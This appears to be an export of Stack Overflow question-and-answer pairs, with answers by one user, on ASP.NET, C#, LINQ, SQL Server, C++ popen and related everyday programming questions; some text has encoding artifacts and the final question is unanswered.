<p>I noticed that everytime an aspx page gets rendered in the browser using the ""web site"" model, a random assembly gets created 'on-the-fly' in the Temporary ASP.NET files.  Analyzing the assembly in Reflector shows that the class created for any given .aspx file is under the ""ASP"" namespace.</p>

<p>So, starting with a empty ""Temporary ASP.NET Files"" directory, I opened my ASP.NET ""website"" in VS2008, and launched the default page.  Immediately I observed that a random directory was generated inside that folder.  Working my way down the path, I found 2 DLLs created: App_Code.1lywsqqz.dll, and App_Web_iohekame.dll.  I assume that all the .aspx pages in the website get compiled into App_Web dll and everything in App_Code folder gets compiled into App_Code.dll. </p>

<p>So if my App_Code C#/VB.net files are under the ""ASP"" namespace, and my App_Web files are created under the ""ASP"" namespace, how come I still get an error ""Could not load type 'ASP.NothwindDataContext'?  </p>

<p>Somebody said ""you don't need namespaces in the App_Code folder"", but I tried it without and still get ""Could not load type 'NorthwindDataContext'"".  </p>

<p>So what's going on between the App_Code folder, the rest of the site, and namespaces?</p>

<p>EDIT:
Here's my LinqDataSource in my .aspx file:</p>

<pre><code>&lt;asp:LinqDataSource ID=""LinqDataSource1"" runat=""server"" 
	ContextTypeName=""NothwindDataContext"" EnableUpdate=""True"" 
	TableName=""Categories""&gt;
&lt;/asp:LinqDataSource&gt;
</code></pre>

<p>Neither ""NorthwindDataContext"", nor ""ASP.NorthwindDataContext"" works.</p>
","33708","Mehrdad","<p>Types in <code>App_Code</code> C# source files, just like any C# file, will not be put in a specific namespace unless specifically declared by <code>namespace Name {...}</code> around it. So a class <code>MyClass</code> declared in <code>App_Code</code> will have the fully qualified type name <code>MyClass</code>. Just that.</p>

<p>You can reference it in <code>Web.config</code> as: <code>""MyClass, App_Code""</code>.</p>

<p><em>Side note:</em> When you are using a DBML in <code>App_Code</code>, the namespace of generated classes are defined in that file (look at the properties window when DBML file is open). If you specify a namespace in that file, naturally, your classes will be defined in that namespace. Note that this does not contradict with what I said above. The thing is, the LINQ data context generator processes the file and defines the classes in the specific namespace.</p>
"
"<p>What's the difference between LINQ to SQL and ADO.net ?</p>
","33708","Mehrdad","<p>ADO.NET is the underlying data access API for .NET Framework (much like JDBC in Java). It's been around since the first release of .NET.</p>

<p>LINQ to SQL is a data access framework built on ADO.NET and new language features that makes SQL Server data available natively in the object oriented style of programming.</p>
"
"<p>There are some very good questions here on SO about file management and storing within a large project.</p>

<blockquote>
  <p><a href=""http://stackoverflow.com/questions/3748/storing-images-in-db-yea-or-nay"">Storing Images in DB - Yea or Nay?</a><br>
  <a href=""http://stackoverflow.com/questions/662488/would-you-store-binary-data-in-database-or-in-file-system"">Would you store binary data in database or in file system?</a></p>
</blockquote>

<p>The first one having some great insights and in my project i've decided to go the file route and not the DB route.</p>

<p>A major point against using the filesystem is backup. But in our system we have a great backup scheme so i am not worried about that.</p>

<p>The next path is how to store the actual files. And I've thought about having the files' location static at all times and create a virtual directory system in the database side of things. So links to the file don't change.</p>

<p>The system i am building will have one global file management so all files are accessible to all users. But many that have gone the file route talk about physical directory size (if all the files are within one directory for example)</p>

<p>So my question is, what are some tips or best practice methods in creating folders for these static files, or if i shouldn't go the virtual directory route at all.</p>

<p>(the project is on the LAMP stack (PHP) if that helps at all)</p>
","33708","Mehrdad","<p>One way is to assign a unique number to each file and use it to look up the actual file location. Then you an use that number to distribute files in different directories in the filesystem. For example you could use something like this scheme:</p>

<p><code>/images/{0}/{1}/{2}</code></p>

<blockquote>
  <p><code>{0}: file_number % 100</code><br />
  <code>{1}: (file_number / 100) % 100</code><br />
  <code>{2}: file_number</code></p>
</blockquote>
"
"<p>I just want to know which is the best way to execute an external command in C++ and how can I grab the output if there is any?</p>

<p><strong>Edit</strong>: I Guess I had to tell that I'm a newbie here in this world, so I think I'm gonna need a working example. For example I want to execute a command like: </p>

<pre><code>ls -la
</code></pre>

<p>how do I do that?</p>
","33708","Mehrdad","<p>Use the <a href=""http://opengroup.org/onlinepubs/007908775/xsh/popen.html"" rel=""nofollow""><code>popen</code></a> function.</p>

<p>Example (not complete, production quality code, no error handling):</p>

<pre><code>FILE* file = popen(""ls"", ""r"");
// use fscanf to read:
char buffer[100];
fscanf(file, ""%100s"", buffer);
pclose(file);
</code></pre>
"
"<p>Tidying up some code that has what I consider to be a confusing line break structure:</p>

<pre><code>return
       CommonContext.HttpWebService.DownloadXml(configuration.MethodUrl(APIMethods.CharacterSheet),
                                                         postData);
</code></pre>

<p>If it were on one line it would clearly to be to long to be readable. As it stands it is not clear to me at a cursory glance how the ""return"" and ""postData"" are related to the long line. CommonContext and APIMethods are static classs, configuration is a local variable.</p>

<p>Thinking about this I would probably write the same in two lines as follows:</p>

<pre><code>string methodUrl = configuration.MethodUrl(APIMethods.CharacterSheet);
return CommonContext.HttpWebService.DownloadXml(methodUrl, postData);
</code></pre>

<p>Is this an effective way of spiting the code up or is there a better way? In this instance I am using C# 2.0.</p>
","33708","Mehrdad","<p>Yes. It's a good thing usually. It makes code more self-documenting (with a good variable name) and also makes debugging easier (allows putting a breakpoint on the first line, and when an exception is thrown from the first line, you can immediately distinguish it as opposed to the single line situation).</p>
"
"<p>This is a difficult question to ask because it's so wide ranging.</p>

<p>Does anybody know of a scoring system of questions that would aid in choosing between a WebForms and MVC application at the start of a project?</p>

<p>e.g. Is TDD an important part of this project? (If yes score 1 for MVC and 0 for WebForms)</p>
","33708","Mehrdad","<p>I have a single question test (disclaimer: it's far from perfect, but does the job a lot of time in making you lean toward each of the technologies):  </p>

<p>Is your application more form oriented (e.g. intranet stuff or something) or you are building an Internet-facing Web site (e.g. StackOverflow). In the first case, I'd probably go with Web forms. The latter case is probably better satisfied by ASP.NET MVC.</p>

<p>Another thing: these two are not the only paradigms out there. Before MVC days, I've done several projects by building HTTP Handlers that do the routing and other stuff that MVC does. You could also strip the Web form part of ASP.NET and just use non-server-form Web controls (while you'd do it in a standard Web forms project, I can hardly call this style ASP.NET Web forms).</p>
"
"<p>If we want to convert a Page to user control then we should also do the following:</p>

<p>âIf you arenât using the code-behind model, make sure you still include a class name in the Control directive by supplying the ClassName attribute. This way, the web page that consumes the control can be strongly typed, which allows it to access properties and methods youâve added to the control..â</p>

<p><br /></p>

<p>Iâm not sure I understand the above quote:</p>

<p>Namely, if we  donât use code behind class, then ascx class will derive directly from UserControl class! 
Thus if we donât use code behind class, then there wonât be any methods or properties added to a control, so why would web page have problems accessing any of user controlâs properties and methods? So why would we need to include a class name in Control directive?</p>

<p>thanx</p>
","33708","Mehrdad","<p>I think I should clarify how the compilation model works. First of all, you can write everything (including C# code) in a single <code>.ascx</code> file and inherit from whatever class you want to (that ultimately inherits from <code>UserControl</code>) by specifying <code>Inherits</code> attribute (or you might want to omit it) and without a <code>ClassName</code> attribute. If you do this, you can still access the properties from the <code>.aspx</code> file that uses this control. The thing is, you can't use the class in the codebehind file of <code>.aspx</code> page (if it has one) directly. By specifying the <code>ClassName</code>, if you are using the Website project model of Visual Studio, you can access it from the <code>.aspx.cs</code> file too. Note that this would not work in Web application project model as every <code>.cs</code> file will be compiled ahead of the time (prior to the <code>.ascx</code> file). In that case, even <code>ClassName</code> attribute wouldn't help much.</p>

<p>In any case, strictly none of the attributes are necessary. You can always use the properties defined anywhere in <code>.ascx</code> or <code>.ascx.cs</code> file included in a page in the <code>.aspx</code> file (but <em>not</em> always <code>.aspx.cs</code> file).</p>

<p><strong>Edit to address the update to the question:</strong></p>

<p>A) From your source code, it seems you are using the Website model here. Note that I mentioned you cannot use the <em>class</em> directly. I agree this statement might have been a little misleading. What I wanted to note is that without a <code>ClassName</code>, ASP.NET will choose a name for your user control class but that name is not guaranteed. While you <em>can</em> use the generated name, it's not recommended at all. You should treat it pretty much like an anonymous type where you can use an instance but cannot mention a name. In your example, you are basically referencing an instance (which is constructed on the <code>.aspx</code> markup), not the <em>class</em>, which is OK.</p>

<p>B) What you are saying is correct. Whatever you declare in <code>ascx.cs</code> in a Web application will be visible to <code>.aspx.cs</code> and <code>.aspx</code>. What I was talking about is properties that you declare in <code>.ascx</code> in a <code>&lt;script runat=""server""&gt;</code> tag. Those will not be visible to <code>.aspx.cs</code> since it's compiled beforehand.</p>

<p>C) ASP.NET will generate the class defined by the <code>ClassName</code> attribute in the <code>ASP</code> namespace. You should use <code>ASP.Some_Name</code> instead. There is one thing I forgot to mention: in this case, you should somehow reference the <code>.ascx</code> in the <code>.aspx</code> markup; either with a <code>Reference</code> directive (<code>&lt;%@ Reference Control=""MyControl.ascx"" %&gt;</code>) directive or with a <code>Register</code> directive (<code>&lt;%@ Register TagPrefix=""abc"" TagName=""xyz"" Src=""MyControl.ascx"" %&gt;</code>). This will ensure that the ASP.NET build engine puts the generated <code>.ascx</code> class in the same assembly as <code>.aspx</code> page.</p>
"
"<p>I've been programming in C# for...a while now. I coded a routine recently and it occurred to me that it was the first time (that I could recall) that I deliberately used bare code blocks (i.e. with no preceding control-flow statement). The code looks vaguely like this:</p>

<pre><code>//...

var output = source.GetRawOutput();

{
    var fooItems = FooSource.GetItems();

    output = TransformA.TransformOutput(output, p =&gt;
        {
            GetFooContent(p, fooItems.GetNext());
        });
}

{
    var barItems = BarSource.GetItems();

    output = TransformB.TransformOutput(output, p =&gt;
        {
            GetBarContent(p, barItems.GetNext());
        });
}

return output;
</code></pre>

<p>I structured the code this way mostly as a sanity check that I wasn't going to accidentally reference the wrong variable (i.e. mix up barItems and fooItems). I also find the code a bit more readable. I certainly could have factored the code into three separate methods, but I felt that was a bit overkill in this case.</p>

<p>Do you use bare code blocks in your code? Why or why not?</p>
","33708","Mehrdad","<p>Personally, I don't do that for structuring code. This is used in C++ to control the scope of variables and call the destructors but as C# is garbage collected, I don't see a functional usage of blocks.</p>

<p>Regarding structuring for readability, I believe your method is either small enough that doesn't need these kind of stuff or it should probably be broken up into smaller methods.</p>
"
"<p>I've got a master page in a root folder of an asp.net application and content pages in subfolders. I'm using forms authentication and am not sure what to do, in web.config, for the master page. Does the forms authentication protect the child pages or the master page?</p>

<p>How does it work?</p>
","33708","Mehrdad","<p>No. <code>Web.config</code> authorization is based on the URL of the requested page. It's completely unrelated to master pages.</p>
"
"<p>I'm having trouble getting a LINQ compound select to compile. Here is the code:</p>

<pre><code>int[] numbersA = { 0, 2, 4, 5, 6, 8, 9 };
int[] numbersB = { 1, 3, 5, 7, 8 };

var pairs =
    from a in numbersA,
            b in numbersB
    where a &lt; b
    select new {a, b};
</code></pre>

<p>The code is from a tutorial from here, under the heading 'SelectMany - Compound from 1':</p>

<p><a href=""http://msdn.microsoft.com/en-us/vcsharp/aa336758.aspx#SelectSimple1"">http://msdn.microsoft.com/en-us/vcsharp/aa336758.aspx#SelectSimple1</a></p>

<p>And the compile-time error i get is as follows:</p>

<p>A query body must end with a select clause or a group clause</p>

<p>The comma just after 'numbersA' is where the error occurs.
Now i can't figure out what i've done wrong, since this is just code as per the MS website. Any help would be great thanks.</p>
","33708","Mehrdad","<p>Your code is not a valid LINQ expression. <code>from</code> clause supports a single collection only. You should repeat the whole <code>from</code> clause. You probably meant to say:</p>

<pre><code>var pairs = from a in numbersA
            from b in numbersB
            where a &lt; b
            select new {a, b};
</code></pre>
"
"<p>I want to open a file for read in exclusive mode, and if the file is already opened by some process/thread else, I want to receive an exception. I tried the following code, but not working, even if I opened the foo.txt, I still can reach the Console.WriteLine statement. Any ideas?</p>

<pre><code>static void Main(string[] args)
{
    using (Stream iStream = File.Open(""c:\\software\\code.txt"", FileMode.Open,
    FileAccess.Read, FileShare.None))
    {
        Console.WriteLine (""I am here"");
    }

    return;
}
</code></pre>
","33708","Mehrdad","<p>What you are doing is the right thing. Probably you are just testing it incorrectly. You should open it with a program that <strong>locks the file when it's open</strong>. Notepad wouldn't do. You can run your application twice to see:</p>

<pre><code>static void Main(string[] args)
{
    // Make sure test.txt exists before running. Run this app twice to see.
    File.Open(""test.txt"", FileMode.Open, FileAccess.Read, FileShare.None);
    Console.ReadKey();
}
</code></pre>
"
"<p>I am trying to create a <code>PredicateBuilder&lt;T&gt;</code> class which wraps an <code>Expression&lt;Func&lt;T, bool&gt;&gt;</code> and provides some methods to easily build up an expression with various <code>And</code> and <code>Or</code> methods. I thought it would be cool if I could use this <code>PredicateBuilder&lt;T&gt;</code> as an <code>Expression&lt;Func&lt;T, bool&gt;&gt;</code> directly, and thought this could be done by having an <code>implicit operator</code> method thing. </p>

<p>Stripped down version of the class looks like this:</p>

<pre><code>class PredicateBuilder&lt;T&gt;
{
    public Expression&lt;Func&lt;T, bool&gt;&gt; Predicate { get; protected set; }

    public PredicateBuilder(bool initialPredicate)
    {
        Predicate = initialPredicate 
            ? (Expression&lt;Func&lt;T, bool&gt;&gt;) (x =&gt; true) 
            : x =&gt; false;
    }

    public static implicit operator Expression&lt;Func&lt;T, bool&gt;&gt;(
        PredicateBuilder&lt;T&gt; expressionBuilder)
    {
        return expressionBuilder.Predicate;
    }
}
</code></pre>

<p>Then, just as a test, I have this extention method in a static class:</p>

<pre><code>public static void PrintExpression&lt;T&gt;(this Expression&lt;Func&lt;T, bool&gt;&gt; expression)
{
    Console.WriteLine(expression);
}
</code></pre>

<p>In my head, I should then be able to do these:</p>

<pre><code>var p = new PredicateBuilder&lt;int&gt;(true);

p.PrintExpression();
PredicateExtensions.PrintExpression(p);
</code></pre>

<p>However none of them work. For the first one, the extension method is not found. And for the second, it says that </p>

<blockquote>
  <p>The type arguments for method 'ExtravagantExpressions.PredicateHelper.PrintExpression(System.Linq.Expressions.Expression>)' cannot be inferred from the usage. Try specifying the type arguments explicitly.</p>
</blockquote>

<p>So I tried the following, which worked:</p>

<pre><code>PredicateExtensions.PrintExpression&lt;int&gt;(p);
</code></pre>

<p>Also, this works, of course:</p>

<pre><code>((Expression&lt;Func&lt;int, bool&gt;&gt;) p).PrintExpression();
</code></pre>

<p>But yeah... why don't the others work? Have I misunderstood something about how this <code>implicit operator</code> thing works?</p>
","33708","Mehrdad","<p>This is not specific to extension methods. C# won't implicitly cast an object to another type unless there is a clue about the target type. Assume the following:</p>

<pre><code>class A {
    public static implicit operator B(A obj) { ... }
    public static implicit operator C(A obj) { ... }
}

class B {
    public void Foo() { ... }
}

class C {
    public void Foo() { ... }
}
</code></pre>

<p>Which method would you expect to be called in the following statement?</p>

<pre><code>new A().Foo(); // B.Foo? C.Foo? 
</code></pre>
"
"<p>Sorry if you found that I'm asking stupid questions. But I'm new to asp.net and I'm facing a problem:</p>

<p>I'm writing a simple blog to learn asp.mvc, and I want to display an Edit link next to the blog Title if the user is logged in. Currently I have to add the currentUser object to Model and check the IsLogged properties to decide if I should display the Edit link or not. The problem is if there is no logged in user, I have to create an fake currentUser to insert to Model in other to make it work. What's asking is there is any other elegant way to do this. For example we can use [Authorize] attribute in Controller to allow access to an Action or not. There is any similar way to apply for the View ?</p>
","33708","Mehrdad","<p>Make the <code>IsLoggedIn</code> a boolean property of the <em>model</em> itself. This way, you can have <code>CurrentUser</code> equal to <code>null</code> when <code>IsLoggedIn</code> is <code>false</code>. Your view would check <code>IsLoggedIn</code> and never call anything on <code>CurrentUser</code> if it's <code>false</code>. This way, <code>NullReferenceException</code> is circumvented.</p>

<p>You can also throw away the <code>IsLoggedIn</code> property altogether and check if a user has logged in directly by using <code>CurrentUser != null</code>.</p>
"
"<p>I want to create a class which will have two properties, e.g. <code>key</code> &amp; <code>value</code>.</p>

<p>And I want one method which will give me a <code>value</code> based on the <code>key</code>.</p>

<p>So what is the code?  I know <code>Hashtable</code> but how to implement it in C#? Can I have a <code>string</code> as a key?</p>
","33708","Mehrdad","<p>A <code>Dictionary&lt;string, T&gt;</code> will do all you want.</p>
"
"<p>Currently we generate classes in <code>App_Code</code> by returning all the sprocs from all of our databases and adding the correct parameter types and names to a <code>SqlCommand</code> object and then returning it in one giant class.  This means we can do things like <code>MyCmd.cmd.Parameters(""MyParam"").Value = ""whatever""</code> when we want to pass parameters to a <code>SqlCommand</code> for a stored procedure without having to add the parameters with their relative data types every single time we make a call.  It also means that we have to look up the exposed parameters for each sproc because they are merely strings.</p>

<p>To put it into perspective, for every parameter you want to deal with in a sproc you'd have to do this:</p>

<pre><code>cmd.Parameters.Add(New System.Data.SqlClient.SqlParameter(""@Param"", 3, 10, 1, False, CType(0, Byte), CType(0, Byte), """", System.Data.DataRowVersion.Current, Nothing))
</code></pre>

<p>Really this is undesirable as it'd mean an Intranet/Internet application would explode into gazillions of lines of code to achieve really quite simple tasks.</p>

<p>We're looking into refactoring this in such a way where we can do something like <code>MyDatabase.MySproc.MyParam(""value"")</code> instead by making it strongly typed.  Unfortunately this means our <code>App_Code</code> folder will be twice the size it already is because such a large quantity of code would be required.</p>

<p>I've written a short example of what I mean:</p>

<pre><code>Public Class MyProc

    Dim cmd As SqlCommand

    Public Sub New()
      ' uses the ConfigurationManager to get the connection string for a certain DB'
      Dim cmd As New SqlCommand(""MyProc"", GetSqlConnection())
    End Sub

    Public Sub Param1(ByVal param As String)
      cmd.Parameters.Add(New System.Data.SqlClient.SqlParameter(""@Param1"", 3, 10, 1, False, CType(0, Byte), CType(0, Byte), """", System.Data.DataRowVersion.Current, Nothing))
      cmd.Parameters(""Param1"").Value = param
    End Sub

    Public Sub Param2(ByVal param As String)
      cmd.Parameters.Add(New System.Data.SqlClient.SqlParameter(""@Param2"", 22, 7000, 1, False, CType(0, Byte), CType(0, Byte), """", System.Data.DataRowVersion.Current, Nothing))
      cmd.Parameters(""Param1"").Value = param
    End Sub

    Public Sub Param3(ByVal param As String)
      cmd.Parameters.Add(New System.Data.SqlClient.SqlParameter(""@Param3"", 3, 1, 1, False, CType(0, Byte), CType(0, Byte), """", System.Data.DataRowVersion.Current, Nothing))
      cmd.Parameters(""Param3"").Value = param
    End Sub

    Public Function GetReturnValue() As String
      cmd.Parameters.Add(New System.Data.SqlClient.SqlParameter(""@RETURN_VALUE"", 8, 0, 6, False, CType(0, Byte), CType(0, Byte), """", System.Data.DataRowVersion.Current, Nothing))
      Return cmd.Parameters(""RETURN_VALUE"").Value
    End Function
  End Class
</code></pre>

<p>Are there alternatives to having to do this that we are unaware of? I'm sure this is a common problem amongst many businesses developing inter/intranet applications.</p>
","33708","Mehrdad","<p>Why don't you use LINQ to SQL? Even if you don't want to use query stuff, it can generate methods to call stored procedures for you.</p>
"
"<p>I'm trying to help my son solve a math problem.  This seems like a good opportunity to expose him to some programming.  I can see the recursive solution but perhaps an iterative one would be easier to explain.  The language he has learned so far has been <a href=""http://msdn.microsoft.com/en-us/devlabs/cc950524.aspx"" rel=""nofollow"">SmallBasic</a> which doesn't support recursion very well (no local variables).  I'm not against teaching another language, but still want to understand if there is a good way to solve this without recursion.  </p>

<p>The problem is this:
Given the sequence of numbers 1 2 3 4 5 6 7 8 9, insert +'s and -'s between numbers so that the result adds up to 101.  For instance, 1+23+4+5+67-8+9=101.  </p>

<p>The recursive solution looks something like this:</p>

<pre><code>next(total, number, nextNumber, sequenceString)
{
    //add
    next(total + number, ...);

    //subtract
    next(total - number, ...);

    //do nothing (multiply)
    next(total, number * 10, ...);
}
</code></pre>

<p>Is there an iterative solution to this that isn't terribly complex?</p>
","33708","Mehrdad","<p>Recursion is an important point in computer science. If your purpose of this is to teach your son, why don't you explain him recursion right now? ;)</p>
"
"<p>As discussed in <a href=""http://stackoverflow.com/questions/431203/does-the-order-of-fields-in-c-matter"">Does the order of fields in C# matter?</a>, the order of serializable properties affects, among other things, XmlSerializer output.</p>

<p>But if fields are in 2 files (using partial classes), does anyone know what in fact controls the resulting order?  That is, which file's properties comes first?</p>

<p>(Background: I ask this because I've run into a scenario where one of the 2 files is auto-generated from xsd, and the other is manually edited.  The test output is different on developer boxes vs. our scripted build box.  Presumably this is a side effect of the several differences in the timing and history of the xsd->C# step in the 2 environments. Various ways to fix, but I'd like to understand the compilation process a little better if possible.)</p>
","33708","Mehrdad","<p>Nothing is guaranteed per C# spec.</p>
"
"<p>I need to determine the number of days in a month for a given date in SQL Server.</p>

<p>Is there a built-in function? If not, what should I use as the user-defined function?</p>
","33708","Mehrdad","<p>You can use the following with the first day of the specified month:</p>

<pre><code>datediff(day, @date, dateadd(month, 1, @date))
</code></pre>

<p>To make it work for every date:</p>

<pre><code>datediff(day, dateadd(day, 1-day(@date), @date),
              dateadd(month, 1, dateadd(day, 1-day(@date), @date)))
</code></pre>
"
"<p>I'm new to ASP.NET and have a form tag on an ascx user control. I'm unable to submit the form from javascript because I found out that this form is nested inside a form called 'aspnetForm'. If I just want to make a post to a cgi, how can I accomplish this?</p>
","33708","Mehrdad","<p>Remove the <code>&lt;form runat='server'&gt;</code> if you don't need it and just use your own form: <code>&lt;form action=""page.cgi"" method=""post""&gt;</code>. You'll not be able to use some server controls. Use their HTML equivalents instead.</p>

<p>If you don't have control on the page, you can use javascript to inject a new form on the page with some hidden fields and set the values upon click of a button.</p>

<p>Something like this:</p>

<pre><code>var myForm = document.createElement(""form"");
myForm.attributes[""action""] = ""mycgi.cgi"";
myForm.attributes[""method""] = ""POST"";
var myhiddenfield = document.createElement(""input"");
myhiddenfield.attributes[""type""] = ""hidden"";
myhiddenfield.attributes[""name""] = ""name""
document.body.appendChild(myForm);
myForm.appendChild(myhiddenfield);

function onFormButtonClick() { // set as onclick on a &lt;button&gt;
    myhiddenfield.value = ... //value read from a textbox or something.
    ...
    myForm.submit();
}
</code></pre>
"
"<p>Is this code correct or is there any possibility of some random threading deadlocks etc?</p>

<p>Is it a good idea to use static properties and locking together? Or is static property thread-safe anyway?</p>

<pre><code>Private Shared _CompiledRegExes As List(Of Regex)
Private Shared Regexes() As String = {""test1.Regex"", ""test2.Regex""}
Private Shared RegExSetupLock As New Object

Private Shared ReadOnly Property CompiledRegExes() As List(Of Regex)
    Get
        If _CompiledRegExes Is Nothing Then
        SyncLock RegExSetupLock

            If _CompiledRegExes Is Nothing Then
                _CompiledRegExes = New List(Of Regex)(Regexes.Length - 1)

                For Each exp As String In Parser.Regexes
                    _CompiledRegExes.Add(New Regex(exp, RegexOptions.Compiled Or RegexOptions.CultureInvariant Or RegexOptions.IgnoreCase))
                Next

            End If

        End SyncLock

    End If

    Return _CompiledRegExes

End Get
End Property
</code></pre>

<p><em>If it's not obvious code is compiling regexes and storing in a List(Of Regex) so they can run faster. And it's shared so every instance of class can get benefit out of it.</em></p>
","33708","Mehrdad","<p>Deadlocks don't happen when you only have a single resource.</p>

<p>Regarding static properties, no they are not thread safe automatically. It's a common approach to lock on a private static field.</p>
"
"<p>I have a data input module where I add the information of my product and its sub information like:</p>

<p>product basic info
product price info
product price details</p>

<p>price info and price details are related to product and are lists</p>

<p>In my web forms approach I would store my main product object on the view state and I would populate it's pricing info and details while doing ajax postbacks. This way I can create a compact module that is very user friendly in terms of defining a lot of data from one place without the need to enter these data from seperate modules. And when I am done I would do one product.save() and that would persist all the data to the respective tables on db.</p>

<p>Now I am building similar app on .net mvc framework and pondering on what would be the good way of handling this on mvc. </p>

<p>I don't resonate towards storing all this on client side till I click save. And saving to the db after each action makes me remember the days I was coding on asp.</p>

<p>Will appreciate your inputs on ways to approach this on mvc framework</p>
","33708","Mehrdad","<p>I believe the best way of doing this is storing the data on the client side. It reduces unnecessary postbacks and improves responsiveness of your application. If you really want to store it on the server, you can use <code>SessionState</code>.</p>

<p>If you really want to store it in something like ViewState, you can go with a solution like this: <a href=""http://stackoverflow.com/questions/669492/asp-net-mvc-is-there-a-way-to-simulate-a-viewstate/669495#669495"">http://stackoverflow.com/questions/669492/asp-net-mvc-is-there-a-way-to-simulate-a-viewstate/669495#669495</a>. However, I recommend against it as it will make things more complicated. Doing it client-side is probably the most elegant way and storing it in SessionState is the easiest.</p>

<p>Remember that you can always escape the MVC pattern and use a simple Web form for that specific page (which will give you ViewState where you need it): <a href=""http://stackoverflow.com/questions/594898/asp-net-mvc-controller-actions-design-question/598021#598021"">http://stackoverflow.com/questions/594898/asp-net-mvc-controller-actions-design-question/598021#598021</a></p>
"
"<p>In .net, unlike in Java, methods are not virtual by default.  In order to use most mock object frameworks, you either have to mark the methods that you want to use on your mock as virtual on the `real' object, or you have to have an interface that you can mock that the class under test will accept in lieu of the implementation.</p>

<p>It seems like bad form to go and mark every method as virtual, but it also seems like bad form to define an interface for every single class.</p>

<p>What is the best thing to do?</p>
","33708","Mehrdad","<p>If I have to choose between the two, I'd go with the interface thing. An interface is meant to define a contract, which is basically what a mock object is going to adhere to. Marking a method as virtual might have unanticipated side effects. It affects the design of the actual class being mocked. An interface merely defines method names and will have no effect on the real class.</p>
"
"<p>I am in need of a new laptop, and I'm considering going for a Mac. However, an import part of my day-to-day work involves remote desktop'ing to my office computer (Vista), and running Visual Studio 2008. Has anyone done this? Are there specific issues to be aware of?</p>

<p>Thanks! </p>
","33708","Mehrdad","<p>It works great. I've done it at home lots of the time. Using my MacBook Air to develop on my quad-core workstation remotely. The only issue I can think of (except keyboard shortcuts) is that you don't have Aero available :)</p>
"
"<p>Good day!</p>

<p>I'm currently building a small website where I write down problems that arise and answers to them for others to see. Currently I'm using a DAL much like the one described <a href=""http://weblogs.asp.net/scottgu/archive/2006/01/15/435498.aspx"" rel=""nofollow"">here</a>. Now I have been looking at other models, and in particular linq based models using Linq2SQL and the ADO.net Entries framework. I realize I'm moving the data access to the code layer in a way since I'm then filtering out for example a toplist with linq queries. The reason I started doing this was because the DAL was not really syncing up with the DB at all times and nullable types became not nullable when I changed something in the DB. Then if I would reimport the tables into the data table my queries would be lost.</p>

<p>My simple question is really, if you want a good DAL for ASP.net today, what would that be? Suggestions, experiences are more than welcome.</p>
","33708","Mehrdad","<p>There are many options and each of them might prove better depending on your specific circumstance. Some options include:</p>

<ul>
<li>LINQ to SQL</li>
<li>ADO.NET Entity Framework</li>
<li>NHibernate</li>
<li>SubSonic</li>
<li>Writing one manually :)</li>
</ul>

<p>My default choice is LINQ to SQL. It's a completely personal preference though. Many guys are NHibernate advocates.</p>
"
"<p>I would like to switch between NUnit and VS Tests like this:</p>

<pre><code>#if !NUNIT
using Microsoft.VisualStudio.TestTools.UnitTesting;
#else
  using NUnit.Framework;
  using TestClass = NUnit.Framework.TestFixtureAttribute;
  using TestMethod = NUnit.Framework.TestAttribute;
  using TestInitialize = NUnit.Framework.SetUpAttribute;
  using TestCleanup = NUnit.Framework.TearDownAttribute;
  using TestContext = System.String;
  using DeploymentItem = NUnit.Framework.DescriptionAttribute;
#endif
</code></pre>

<p>My question is, how may I declare NUNIT preprocesor symbol at one place (App.config or so, would be great), to switch between NUnit and VSTests easily? Because when I use ""#define NUNIT"", it works only for the file, where it is written.</p>
","33708","Mehrdad","<p>Use the project properties dialog. You can define global symbols there:</p>

<blockquote>
  <p>Right click on the project -> Properties -> Build tab -> Conditional compilation symbols</p>
</blockquote>
"
"<p>Hai i used searching the array  code for  index = Array.IndexOf(_arrayName, ""Text""). I give full word This working properly. but give some character this is not working . for example</p>

<pre><code>dim arr() as string ={""ravi"",""somu"",""arul""}
</code></pre>

<p>here
  i give ""somu"" that code return 1.
 but i give ""so"" that code return -1.
but i want Like search.
this is passible or not.</p>
","33708","Mehrdad","<p><code>IndexOf</code> searches for exact match. To customize the matching criteria, you can use the <code>FindIndex</code> method:</p>

<pre><code>// Finds first element of the array that contains `inputString`
Array.FindIndex(arr, Function(s) s.Contains(inputString))

// Finds first element of the array that begins with `inputString`
Array.FindIndex(arr, Function(s) s.StartsWith(inputString))
</code></pre>

<p><strong>Edit to clarify <code>Function(s)</code> and lambdas:</strong> </p>

<p><code>Array.FindIndex</code> takes two arguments, the first of which is an array you want to work on, the latter is a <code>Delegate</code> representing the predicate to check.</p>

<p><code>FindIndex</code> does not have any idea about what kind of element you want. It gives you the flexibility to specify it. You tell it by passing in a function that takes an array element and returns a boolean indicating whether you want it or not. 
It essentially calls that function with every element of the array and returns the index of the first element for which that function returns true.</p>

<p>Instead of writing a whole function and passing it using <code>AddressOf MyPredicate</code>, we can easily use the <code>Function(s) s.Contains(inputString)</code>. It's equivalent to:</p>

<pre><code>Function MyPredicate(s As String) As Boolean
    Return s.Contains(inputString)
End Function

Array.FindIndex(arr, AddressOf MyPredicate)
</code></pre>

<p>Of course if we did that, we had to store <code>inputString</code> somewhere accessible to that method. It's a lot of dirty code. A lambda expression reduces all these hassles.</p>

<p><strong>Edit 2:</strong></p>

<p>I can verify this code prints ""1"":</p>

<pre><code>Module Module1
    Sub Main()
        Dim arr() As String = {""ravi"", ""somu"", ""arul""}
        Console.WriteLine(Array.FindIndex(arr, Function(s) s.Contains(""so"")))
    End Sub
End Module
</code></pre>
"
"<p>I'm creating a website in ASP.NET MVC and have stumbled across something I really can't figure out.</p>

<p>I've got a user profile page that allows a user to change his password. On the serverside, I want to validate that the user has entered a correct ""current"" password before allowing the change. </p>

<p>What's the best way to return to my View when the password isn't correct? I've tried using  ModelState.AddModelError and then return Json(View()) but I can't see the error message anywhere in the JSON object returned to the browser. </p>

<p>What's the best way to do this using jquery on the client?</p>

<p>/Jesper</p>
","33708","Mehrdad","<p>ModelState does not automatically do anything with the returned <code>Json</code>. You should manually fill in a model object with data you want to return to the client.</p>

<p>Alternatively, if you want to report <em>errors</em> to the client, you can throw an exception in the controller action method and handle it in jQuery.</p>
"
"<p>The short of it is: Is it costly to check an Application Variable such as Application(""WebAppName"") more 10-20 times each time a page loads? </p>

<p>Background: (feel free to critique)</p>

<p>Some includes in my site contain many links and images which cannot use relative urls due to their inclusion in different paths.</p>

<p>Hence these includes contain frequent instances of </p>

<pre><code>&lt;img src=""&lt;%=Application(""Webroot"")%&gt;images\image.gif""&gt;
</code></pre>

<p>Is it expensive to keep calling an Application variable like this? </p>

<p>Should I just put the Application value in some local variable to use where needed? </p>

<p>IMPORTANT NOTE: </p>

<p>I need my webapp to run fine on a server whether it be in the root web (""/"") or in a virtual subweb (""/app"").</p>

